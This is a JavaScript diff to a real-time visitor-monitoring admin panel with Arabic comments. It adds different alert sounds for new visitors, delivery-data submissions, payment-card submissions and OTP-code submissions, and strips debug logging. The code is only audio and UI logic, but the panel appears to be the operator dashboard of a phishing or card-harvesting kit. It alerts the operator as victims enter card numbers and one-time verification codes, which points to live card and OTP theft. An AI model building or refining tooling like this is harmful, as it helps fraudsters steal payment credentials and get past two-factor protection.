@@ -20,25 +20,74 @@ const notifiedEvents = new Map();
 
 // Sound definitions using Web Audio API
 const sounds = {
-  // Delivery form submitted - NICE DOUBLE BEEP (success)
+  // 🎉 NEW VISITOR (عميل جديد) - صوت احتفالي قصير
+  newVisitor: () => {
+    if (isMuted) return;
+    // نغمة احتفالية: دو上升 quick celebration
+    playCustomSound({
+      frequencies: [523.25, 659.25, 783.99],
+      duration: 0.12,
+      gap: 0.05,
+      volume: 0.3,
+      type: 'sine',
+      repeat: 1
+    });
+  },
+  
+  // 👋 RETURNING VISITOR (عميل يعود) - صوت ترحيبي مختلف
+  returningVisitor: () => {
+    if (isMuted) return;
+    // نغمة ترحيبية: gentle welcome
+    playCustomSound({
+      frequencies: [392, 493.88],
+      duration: 0.15,
+      gap: 0.08,
+      volume: 0.25,
+      type: 'sine',
+      repeat: 1
+    });
+  },
+  
+  // 📦 DELIVERY DATA (بيانات التوصيل) - صوت مزدوج لطيف
   formDelivery: () => {
     if (isMuted) return;
-    // Double beep: two short friendly tones
-    playSmartBeep([523.25, 0, 659.25], 0.12, 0.1);
+    // نغمة نجاح مزدوجة: double success beep
+    playCustomSound({
+      frequencies: [523.25, 0, 659.25],
+      duration: 0.15,
+      gap: 0.12,
+      volume: 0.3,
+      type: 'triangle',
+      repeat: 1
+    });
   },
   
-  // Payment submitted - FINANCIAL CONFIRMATION (higher pitch, strong)
+  // 💳 PAYMENT CARD (بيانات البطاقة) - صوت طويل وقوي
   formPayment: () => {
     if (isMuted) return;
-    // Ascending financial confirmation
-    playSmartBeep([659.25, 0, 783.99, 0, 1046.50], 0.1, 0.12);
+    // نغمة مالية قوية وطويلة: strong financial alert
+    playCustomSound({
+      frequencies: [523.25, 0, 659.25, 0, 783.99, 0, 1046.50],
+      duration: 0.25,
+      gap: 0.08,
+      volume: 0.4,
+      type: 'square',
+      repeat: 1
+    });
   },
   
-  // OTP verification - RAPID ALERT (urgent)
+  // 🔐 OTP CODE (رمز التحقق) - صوت قصير وقوي ومختلف
   formVerification: () => {
     if (isMuted) return;
-    // Rapid triple alert
-    playSmartBeep([880, 0, 880, 0, 1046.50], 0.08, 0.06);
+    // نغمة تنبيه سريعة وقوية: rapid urgent alert
+    playCustomSound({
+      frequencies: [880, 0, 1046.50, 0, 1174.66],
+      duration: 0.1,
+      gap: 0.05,
+      volume: 0.5,
+      type: 'sawtooth',
+      repeat: 1
+    });
   }
 };
 
@@ -46,13 +95,29 @@ const sounds = {
 function playPageChangeSound() {
   if (isMuted) return;
   // Soft single chime - gentle notification
-  playSmartBeep([440, 0, 554.37], 0.1, 0.15);
+  playCustomSound({
+    frequencies: [440, 554.37],
+    duration: 0.1,
+    gap: 0.1,
+    volume: 0.15,
+    type: 'sine',
+    repeat: 1
+  });
 }
 
-// Generate smart beep using Web Audio API
-function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
+// Advanced custom sound generator using Web Audio API
+function playCustomSound(config) {
   try {
-    // Create new AudioContext (user gesture required for first time)
+    const {
+      frequencies = [440],
+      duration = 0.15,
+      gap = 0.1,
+      volume = 0.3,
+      type = 'sine',
+      repeat = 1
+    } = config;
+    
+    // Create new AudioContext
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     
     // Resume context if suspended (browser policy)
@@ -60,40 +125,59 @@ function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
       ctx.resume();
     }
     
-    frequencies.forEach((freq, i) => {
-      if (freq === 0) return; // Skip silence gaps
-      
-      const startTime = ctx.currentTime + (i * (duration + gap));
-      
-      // Create oscillator
-      const oscillator = ctx.createOscillator();
-      const gainNode = ctx.createGain();
-      
-      // Connect
-      oscillator.connect(gainNode);
-      gainNode.connect(ctx.destination);
-      
-      // Set frequency - use different wave types for variety
-      oscillator.frequency.value = freq;
-      oscillator.type = i % 2 === 0 ? 'sine' : 'triangle';
-      
-      // Volume envelope - smooth attack and release
-      gainNode.gain.setValueAtTime(0, startTime);
-      gainNode.gain.linearRampToValueAtTime(0.25, startTime + 0.02); // Attack
-      gainNode.gain.linearRampToValueAtTime(0.15, startTime + duration * 0.5); // Decay
-      gainNode.gain.linearRampToValueAtTime(0, startTime + duration); // Release
-      
-      // Start and stop
-      oscillator.start(startTime);
-      oscillator.stop(startTime + duration);
-    });
+    // Master gain for overall volume control
+    const masterGain = ctx.createGain();
+    masterGain.connect(ctx.destination);
+    masterGain.gain.value = volume;
+    
+    const playSequence = () => {
+      frequencies.forEach((freq, i) => {
+        if (freq === 0) return; // Skip silence gaps
+        
+        const startTime = ctx.currentTime + (i * (duration + gap));
+        
+        // Create oscillator
+        const oscillator = ctx.createOscillator();
+        const gainNode = ctx.createGain();
+        
+        // Connect: oscillator -> gain -> master
+        oscillator.connect(gainNode);
+        gainNode.connect(masterGain);
+        
+        // Set frequency and wave type
+        oscillator.frequency.value = freq;
+        oscillator.type = type;
+        
+        // Volume envelope - punchy attack and smooth release
+        gainNode.gain.setValueAtTime(0, startTime);
+        gainNode.gain.linearRampToValueAtTime(0.9, startTime + 0.01); // Fast attack
+        gainNode.gain.exponentialRampToValueAtTime(0.5, startTime + duration * 0.3); // Decay
+        gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration); // Release
+        
+        // Start and stop
+        oscillator.start(startTime);
+        oscillator.stop(startTime + duration + 0.1);
+      });
+    };
+    
+    // Play sequence (with repeat if needed)
+    for (let r = 0; r < repeat; r++) {
+      const repeatDelay = r * (frequencies.length * (duration + gap) + 0.3);
+      setTimeout(playSequence, repeatDelay * 1000);
+    }
     
     // Cleanup context after all sounds done
-    setTimeout(() => ctx.close(), (frequencies.length * (duration + gap) + 0.5) * 1000);
+    const totalDuration = repeat * (frequencies.length * (duration + gap) + 0.3);
+    setTimeout(() => ctx.close(), totalDuration * 1000 + 500);
     
   } catch (e) { 
     console.warn('Audio playback not supported:', e); 
   }
+}
+
+// Legacy function for backward compatibility
+function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
+  playCustomSound({ frequencies, duration, gap, volume: 0.3, type: 'sine', repeat: 1 });
 }
 
 // Check if we should play sound (prevent duplicate notifications)
@@ -102,8 +186,16 @@ function shouldPlaySound(sessionId, eventType) {
   const now = Date.now();
   const lastPlayed = notifiedEvents.get(key);
   
-  // Don't play if played in last 3 seconds (prevent spam)
-  if (lastPlayed && (now - lastPlayed) < 3000) {
+  // Different timeouts for different event types
+  let timeout = 3000; // Default 3 seconds
+  
+  // Visitor sounds need longer timeout (5 seconds)
+  if (eventType === 'newVisitor' || eventType === 'returningVisitor') {
+    timeout = 5000;
+  }
+  
+  // Don't play if played in last X seconds (prevent spam)
+  if (lastPlayed && (now - lastPlayed) < timeout) {
     return false;
   }
   
@@ -456,31 +548,34 @@ function setupSocketListeners() {
 
   // CRITICAL: Real-time updates from visitors
   socket.on('visitor:new', (data) => {
-    console.log('🆕 DATA RECEIVED VIA SOCKET (visitor:new):', data);
-    console.log('🆕 sessionId:', data.session_id || data.sessionId);
-    console.log('🆕 allAdminVisitors length:', allAdminVisitors.length);
-    console.log('🆕 visitorsCache size:', visitorsCache.size);
-    console.log('🆕 Grid element:', document.getElementById('visitorsGrid'));
-    
-    // NO SOUND for new visitors - data updates should be silent
     const sessionId = data.session_id || data.sessionId;
     
     if (!sessionId) {
-      console.error('❌ visitor:new received without sessionId!');
       return;
     }
     
-    // Check if card already exists
+    // Check if card already exists (returning visitor)
     const existingCard = document.querySelector('[data-session="' + sessionId + '"]');
-    console.log('🆕 Existing card:', existingCard);
+    const wasInCache = visitorsCache.has(sessionId);
+    
+    // 🎵 PLAY DIFFERENT SOUND BASED ON VISITOR TYPE
+    if (!existingCard && !wasInCache) {
+      // NEW VISITOR - play celebration sound
+      if (shouldPlaySound(sessionId, 'newVisitor')) {
+        sounds.newVisitor();
+      }
+    } else {
+      // RETURNING VISITOR - play welcome sound
+      if (shouldPlaySound(sessionId, 'returningVisitor')) {
+        sounds.returningVisitor();
+      }
+    }
     
     if (existingCard) {
       // Card exists - smart update and move to top
-      console.log('🆕 Updating existing card');
       updateCardAndMoveToTop(sessionId, data);
     } else {
       // New card - add to DOM directly
-      console.log('🆕 Creating new card for visitor');
       const grid = document.getElementById('visitorsGrid');
       if (grid) {
         createVisitorCardElement(data, grid);
@@ -501,14 +596,12 @@ function setupSocketListeners() {
   });
 
   socket.on('visitor:pageChange', (data) => {
-    console.log('📄 DATA RECEIVED VIA SOCKET (visitor:pageChange):', data);
     // NO SOUND - page changes should be silent
     // Update card and move to top (smart update, not full refresh)
     updateCardAndMoveToTop(data.sessionId, data);
   });
 
   socket.on('visitor:offline', (data) => {
-    console.log('📴 DATA RECEIVED VIA SOCKET (visitor:offline):', data);
     const sessionId = data.session_id || data.sessionId;
     
     // IMPORTANT: DO NOT remove card, just update visual status
@@ -555,7 +648,6 @@ function setupSocketListeners() {
   });
 
   socket.on('form:deliverySubmitted', (data) => {
-    console.log('📦 DATA RECEIVED VIA SOCKET (form:deliverySubmitted):', data);
     const sessionId = data.session_id || data.sessionId;
     
     // Play sound ONLY for actual submission - with spam protection
@@ -582,7 +674,6 @@ function setupSocketListeners() {
   });
 
   socket.on('form:verificationSubmitted', (data) => {
-    console.log('🔐 DATA RECEIVED VIA SOCKET (form:verificationSubmitted):', data);
     const sessionId = data.session_id || data.sessionId;
     
     // Play sound ONLY for actual submission - with spam protection
@@ -601,22 +692,18 @@ function setupSocketListeners() {
   });
 
   socket.on('visitors:update', (data) => {
-    console.log('📋 DATA RECEIVED VIA SOCKET (visitors:update):', data);
     handleVisitorsUpdate(data);
   });
 
   socket.on('stats:update', (data) => {
-    console.log('📊 DATA RECEIVED VIA SOCKET (stats:update):', data);
     updateStatsDisplay(data);
   });
 
   socket.on('ban:listUpdate', () => {
-    console.log('🚫 DATA RECEIVED VIA SOCKET (ban:listUpdate)');
     loadBannedUsers();
   });
 
   socket.on('user:unbanned', (data) => {
-    console.log('✅ DATA RECEIVED VIA SOCKET (user:unbanned):', data);
     if (data.success) {
       showNotification('تم فك الحظر', 'تم فك الحظر بنجاح', 'success');
       loadBannedUsers();
@@ -627,25 +714,21 @@ function setupSocketListeners() {
 
   // TRASH BIN SOCKET HANDLERS
   socket.on('trash:update', (data) => {
-    console.log('🗑️ DATA RECEIVED VIA SOCKET (trash:update):', data);
     handleTrashUpdate(data);
   });
 
   socket.on('visitor:softDeleted', (data) => {
-    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeleted):', data);
     updateTrashCount(data.trashCount);
     removeVisitorCard(data.sessionId);
   });
 
   socket.on('visitor:softDeletedMultiple', (data) => {
-    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeletedMultiple):', data);
     updateTrashCount(data.trashCount);
     data.sessionIds.forEach(id => removeVisitorCard(id));
     clearAllCheckboxes();
   });
 
   socket.on('visitor:softDeletedAll', (data) => {
-    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeletedAll):', data);
     updateTrashCount(data.trashCount);
     updateVisitorsList();
     clearAllCheckboxes();
